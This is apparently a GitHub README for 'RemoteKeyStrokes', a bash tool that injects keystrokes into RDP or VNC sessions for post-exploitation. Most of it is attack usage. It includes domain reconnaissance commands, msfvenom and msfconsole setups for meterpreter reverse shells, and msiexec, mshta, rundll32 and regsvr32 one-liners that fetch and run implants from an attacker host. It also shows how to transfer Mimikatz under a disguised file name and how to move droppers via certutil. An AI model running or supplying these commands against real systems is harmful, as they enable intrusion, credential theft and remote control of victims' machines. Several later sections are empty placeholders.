# Description

## Introduction

A script to automate keystrokes through an active remote desktop session that assists offensive operators in combination with living off the land techniques.

## About RKS (RemoteKeyStrokes)

All credits goes to [nopernik](https://github.com/nopernik) for making it possible so I took it upon myself to improve it. I wanted something that helps during the post exploitation phase when executing commands through a remote desktop.

## Features

- Executing commands
- File Transfer
- Execute C# Implant (Coming soon)
- Privilege Escalation (Coming soon)
- Persistence (Coming soon)
- Anti-Forensics (Coming soon)

## Help Menu

```
$ ./rks.sh -h
Usage: ./rks.sh (RemoteKeyStrokes)
Options:
    -c, --command <command | cmdfile>   Specify a command or a file containing to execute
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

    -p, --platform <operating_system>   Specify the operating system (windows is set by
                                        default if not specified)

    -m, --method <method>               Specify the file transfer or execution method
                                        (For file transfer "pwshb64" is set by default if
                                        not specified. For command execution method
                                        "none" is set by default if not specified)

    -w, --windowname <name>             Specify the window name for graphical remote
                                        program (freerdp is set by default if not
                                        specified)

    -h, --help                          Display this help message
```

## Usage

### Internal Reconnaissance

- When running in command prompt

```
$ cat recon_cmds.txt
whoami /all
net user
net localgroup Administrators
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain

$ ./rks.h -c recon_cmds.txt
```

- To execute a single command

`$ ./rks.sh -c "systeminfo"`

### Execute Implant

### Windows

- Execute an implant while reading the contents of the payload in powershell.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh -o implant.ps1

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ ./rks.sh -c "powershell.exe" -m dialogbox

$ ./rks.sh -c implant.ps1
```

- Execute an powershell oneliner implant using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ ./rks.sh -c "powershell.exe -nop -w hidden -e <base64_payload>" -m dialogbox
```

- Execute an implant with `msiexec.exe` while hosting a webserver.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f msi -o implant.msi

$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"

$ sudo python -m http.server 80

$ ./rks.sh -c "msiexec /quiet /qn /i http://<attacker_IP>/implant.msi" -m dialogbox
```

- Execute an implant with `mshta.exe` using `metasploit-framework` exploit module `exploit/windows/misc/hta_server`.

```
$ sudo msfconsole -qx "use exploit/windows/misc/hta_server; set target 2; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvhost <server_IP>; set srvport <server_PORT> exploit"

$ ./rks.sh -c "mshta.exe http://<attacker_IP>:<attacker_PORT>/implant.hta" -m dialogbox
```

- Execute an implant with `rundll32.exe` using `metasploit-framework` exploit module `exploit/windows/smb/smb_delivery`.

```
$ sudo msfconsole -qx "use exploit/windows/smb/smb_delivery; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set file_name implant.dll; set share data; exploit"

$ ./rks.sh -c "rundll32.exe \\<attacker_IP>\data\implant.dll,0" -m dialogbox
```

- Execute an implant with `regsvr32.exe` using `metasploit-framework` exploit module `exploit/multi/script/web_delivery`.

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set target 3; set payload windows/x64/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ ./rks.sh -c "regsvr32 /s /n /u /i://http://<attacker_IP>:<attacker_PORT>/implant.sct scrobj.dll" -m dialogbox
```

- MSBuild

Coming soon

#### Unix

TODO: Fill the missing info

```
$ sudo msfconsole -qx "use exploit/multi/script/web_delivery; set payload python/meterpreter/reverse_tcp; set lhost <IP>; set lport 8443; set srvhost <server_IP>; set srvport <server_PORT>; set uripath implant; exploit"

$ ./rks.sh -c "python -c \"<payload>\""
```

### File Transfer

- Transfer a file remotely when pivoting in a isolated network. If you want to specify the remote path on windows be sure to include quotes. By default it uses Powershell base64 to transfer files if not specified.

```
$ ./rks.sh -c "powershell.exe" -m dialogbox

$ ./rks.sh -i Invoke-Mimikatz.ps1 -o "C:\Windows\Temp\update.ps1" -m pwshb64
[*] Transferring file...
[+] File transferred!
```

- To transfer droppers you can use certutil base64 especially if it's large. Keep in mind it'll take time depending the size of the file.

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=4444 -f exe -o implant.exe`

- For powershell.

```
$ ./rks.sh -c "powershell.exe" -m dialogbox

$ ./rks.sh -i implant.exe -o implant.exe -m pwshcertutil
```

- For command prompt.

```
$ ./rks.sh -c "cmd.exe" -m dialogbox

$ ./rks.sh -i implant.exe -o implant.exe -m cmdb64
```

- Activate your C2 listener and execute the implant

```
$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp set lhost <IP>; set lport 4444; exploit"

$ ./rks.sh -c ".\implant.exe"
```

### Privilege Escalation

TODO: Fill this info after the feature has been implemented

### Persistence

TODO: Fill this info after the feature has been implemented

### Anti Forensics

TODO: Fill this info after the feature has been implemented

### Specify Grapical Remote Software

- If you're targeting VNC network protocols you can specify the window name with `tightvnc`.

`$ ./rks.sh -i implant.ps1 -w tightvnc`

- If you're targeting legacy operating systems with older RDP authentication specify the window name with `rdesktop`.

`$ ./rks.sh -i implant.bat -w rdesktop`

### FAQ

TODO: Fill this info

## TODO and Help Wanted

- [ ] Split into characters to surpass xdotool limitation for `pwshb64` method.

- [ ] Implement Bin2Hex file transfer

- [ ] Implement encryption method of base64

- [ ] Implement a persistence function for both windows and linux.

- [ ] Implement antiforensics function for both windows and linux.

- [ ] Implement to read shellcode input and run C# implant and powershell runspace

- [ ] Implement privesc function for both windows and linux

## References

- [Video: sethc.exe Backdoor CMD Payload delivery (USB Rubber Ducky style)](https://www.youtube.com/watch?v=8YFEujJUxws)

- [Original Script](https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh)

- [sticky_keys_hunter](https://github.com/ztgrace/sticky_keys_hunter)

## Credits

- [nopernik](https://github.com/nopernik)

## Disclaimer

- It is your responsibility depending on whatever the cause of your actions user. Remember that with great power comes with great responsibility.
